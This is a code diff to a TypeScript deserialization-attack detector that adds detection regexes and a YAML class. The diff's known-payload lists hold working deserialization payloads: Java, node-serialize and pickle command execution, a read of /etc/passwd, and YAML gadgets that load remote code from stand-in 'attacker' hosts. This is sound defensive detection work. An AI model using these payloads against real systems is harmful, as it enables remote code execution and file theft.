@@ -1,5 +1,5 @@
 /**
- * Deserialization Invariant Classes — All 3
+ * Deserialization Invariant Classes — All 4
  */
 import type { InvariantClassModule } from '../types.js'
 import { deepDecode } from '../encoding.js'
@@ -59,8 +59,12 @@ export const deserJavaGadget: InvariantClassModule = {
         'application/x-msgpack {"type":"ExtType","className":"java.lang.Runtime"}',
         'H4sIAAAAAAAAA1vzloG1uAgAlouKswYAAAA=',
         'java.lang.Runtime.getRuntime().exec("id")',
+        'org.apache.commons.collections.functors.InvokerTransformer',
+        'org.springframework.core.SerializableTypeWrapper',
         'process.mainModule.require("child_process").exec("id")',
         'require("fs").readFileSync("/etc/passwd","utf8")',
+        `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}`,
+        '<dynamic-proxy><interface>java.lang.Runtime</interface></dynamic-proxy>',
     ],
 
     knownBenign: [
@@ -72,8 +76,8 @@ export const deserJavaGadget: InvariantClassModule = {
     detect: (input: string): boolean => {
         const d = deepDecode(input)
         const compact = d.replace(/\s+/g, '')
-        const javaMagic = /rO0AB(?:Q|X|[A-Za-z0-9+/=])|aced0005|ac[\s:_-]*ed[\s:_-]*00[\s:_-]*05|\\x?ac\\x?ed\\x?00\\x?05/i
-        const gadgetPatterns = /(?:java\.lang\.Runtime|ProcessBuilder|ChainedTransformer|InvokerTransformer|ConstantTransformer|commons-collections|ysoserial|process\.mainModule\.require\s*\(\s*['"]child_process['"]\s*\)|require\s*\(\s*['"]child_process['"]\s*\)|require\s*\(\s*['"]fs['"]\s*\)\s*\.\s*readFileSync)/i
+        const javaMagic = /rO0AB(?:Q|X|[A-Za-z0-9+/=])|aced0005|ac[\s:_-]*ed[\s:_-]*00[\s:_-]*05|\\x?ac\\x?ed\\x?00\\x?05|\\xac\\xed\\x00\\x05/i
+        const gadgetPatterns = /(?:java\.lang\.Runtime|ProcessBuilder|ChainedTransformer|InvokerTransformer|ConstantTransformer|commons-collections|ysoserial|org\.apache\.commons|org\.springframework\.core|process\.mainModule\.require\s*\(\s*['"]child_process['"]\s*\)|require\s*\(\s*['"]child_process['"]\s*\)|require\s*\(\s*['"]fs['"]\s*\)\s*\.\s*readFileSync|_\$\$ND_FUNC\$\$_function\s*\(\)\s*\{[\s\S]{0,120}require\s*\(\s*['"]child_process['"]\s*\)\s*\.\s*exec)/i
         // .NET BinaryFormatter: base64 starting with AAEAAAD
         const dotnetMagic = /^AAEAAAD[A-Za-z0-9+/=]+/
         // Ruby Marshal: \x04\x08 magic bytes (literal or escaped)
@@ -83,7 +87,7 @@ export const deserJavaGadget: InvariantClassModule = {
         // JSON gadget chains (@class, @type for Jackson/Fastjson/Gson)
         const jsonGadget = /"@(?:class|type)"\s*:\s*"(?:com\.|org\.|java\.|sun\.)/
         // XMLDecoder / XStream
-        const xmlDeser = /<(?:java\.beans\.XMLDecoder|object\s+class=["']java\.|java\s+version=)/i
+        const xmlDeser = /<(?:java\.beans\.XMLDecoder|object\s+class=["']java\.|java\s+version=|dynamic-proxy>\s*<interface>\s*java\.lang\.Runtime\s*<\/interface>)/i
         // MessagePack typed extension abuse with embedded class hints
         const msgpackTyped = /application\/x-msgpack[\s\S]{0,120}(?:ExtType|className)|msgpack[\s\S]{0,80}(?:ExtType|className)/i
         return javaMagic.test(compact)
@@ -138,6 +142,7 @@ export const deserPhpObject: InvariantClassModule = {
         'O:+6:"Malice":1:{s:3:"cmd";s:2:"id";}',
         'O : 6 : "Malice" : 0 : {}',
         'a:2:{i:0;s:4:"test";i:1;O:5:"MyObj":0:{}}',
+        'O:10:"WakeChain":1:{s:3:"cmd";s:2:"id";}::__wakeup',
     ],
 
     knownBenign: [
@@ -149,7 +154,12 @@ export const deserPhpObject: InvariantClassModule = {
 
     detect: (input: string): boolean => {
         const d = deepDecode(input)
-        return /\b(?:O|C)\s*:\s*[+-]?\d+\s*:\s*"[^"]+"\s*:/.test(d) ||
+        const phpObject = /\b(?:O|C)\s*:\s*[+-]?\d+\s*:\s*"[\w\\]+"\s*:/.test(d)
+        const phpArrayContainer = /\ba\s*:\s*[+-]?\d+\s*:\s*\{/.test(d)
+        const phpWakeupChain = /(?:__wakeup|__destruct|__toString)\b/i.test(d) && /\b(?:O|C)\s*:\s*[+-]?\d+\s*:/.test(d)
+        return phpObject ||
+            phpArrayContainer ||
+            phpWakeupChain ||
             /\ba\s*:\s*[+-]?\d+\s*:\s*\{/.test(d) ||
             /"(?:__proto__)"\s*:\s*\{|"constructor"\s*:\s*\{\s*"prototype"\s*:/.test(d)
     },
@@ -192,6 +202,8 @@ export const deserPythonPickle: InvariantClassModule = {
         "csubprocess\nPopen\n(S'id'\ntR.",
         "cbuiltins\nexec\n(S'__import__(\"os\").system(\"id\")'\ntR.",
         '!!python/object/apply:os.system ["id"]',
+        '\\x80\\x04\\x95\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00cos\\nsystem\\n',
+        "<class 'Exploit'> __reduce__",
     ],
 
     knownBenign: [
@@ -203,10 +215,12 @@ export const deserPythonPickle: InvariantClassModule = {
 
     detect: (input: string): boolean => {
         const d = deepDecode(input)
-        return /(?:\x80[\x02-\x05]|\\x80\\x0[2-5])/.test(d) ||
+        return /(?:\x80[\x02-\x05]|\\x80\\x0[2-5]|\\x80\\x04\\x95)/.test(d) ||
+            /cos\nsystem\n/i.test(d) ||
             /(?:^|\n)c(?:os|posix|subprocess|builtins|__builtin__)\n(?:system|popen|eval|exec|__import__)\n/i.test(d) ||
             /(?:^|\n)c[a-zA-Z0-9_.]+\n[a-zA-Z0-9_.]+\n[\s\S]{0,180}\(?(?:S|I|J|K|M|N|V|X)[\s\S]{0,180}tR\./i.test(d) ||
-            /!!python\/object\/apply\s*:/i.test(d)
+            /!!python\/object\/apply\s*:/i.test(d) ||
+            /__reduce__/i.test(d)
     },
     detectL2: l2DeserPython,
     generateVariants: (count: number): string[] => {
@@ -230,4 +244,49 @@ export const deserPythonPickle: InvariantClassModule = {
     },
 }
 
-export const DESER_CLASSES: InvariantClassModule[] = [deserJavaGadget, deserPhpObject, deserPythonPickle]
+export const yamlDeserialization: InvariantClassModule = {
+    id: 'yaml_deserialization',
+    description: 'YAML deserialization gadget chain leading to arbitrary code execution',
+    category: 'deser',
+    severity: 'critical',
+    calibration: { baseConfidence: 0.94 },
+    mitre: ['T1203'],
+    cwe: 'CWE-502',
+    knownPayloads: [
+        '!!python/object/apply:os.system ["id"]',
+        '!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker"]]]]',
+        '!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: "rmi://attacker/Exploit", autoCommit: true}',
+        '!!java.lang.ProcessBuilder ["/bin/sh","-c","id"]',
+    ],
+    knownBenign: [
+        'name: api-service',
+        'version: "1.0"',
+        'database:\n  host: localhost',
+    ],
+    detect: (input: string): boolean => {
+        const d = deepDecode(input)
+        return /!!python\/object\/apply\s*:\s*os\.system/i.test(d) ||
+            /!!javax\.script\.ScriptEngineManager\b/i.test(d) ||
+            /!!com\.sun\.rowset\.JdbcRowSetImpl\b/i.test(d) ||
+            /!!java\.lang\.(?:ProcessBuilder|Runtime)\b/i.test(d)
+    },
+    generateVariants: (count: number): string[] => {
+        const seeds = [
+            '!!python/object/apply:os.system ["id"]',
+            '!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker"]]]]',
+            '!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: "rmi://attacker/Exploit", autoCommit: true}',
+            '!!java.lang.ProcessBuilder ["/bin/sh","-c","id"]',
+        ]
+        const mutated = seeds.flatMap(payload => [
+            payload,
+            encodeURIComponent(payload),
+            encodeURIComponent(encodeURIComponent(payload)),
+        ])
+        const variants = mutated.filter(candidate => yamlDeserialization.detect(candidate))
+        const out: string[] = []
+        for (let i = 0; i < count; i++) out.push(variants[i % variants.length])
+        return out
+    },
+}
+
+export const DESER_CLASSES: InvariantClassModule[] = [deserJavaGadget, deserPhpObject, deserPythonPickle, yamlDeserialization]
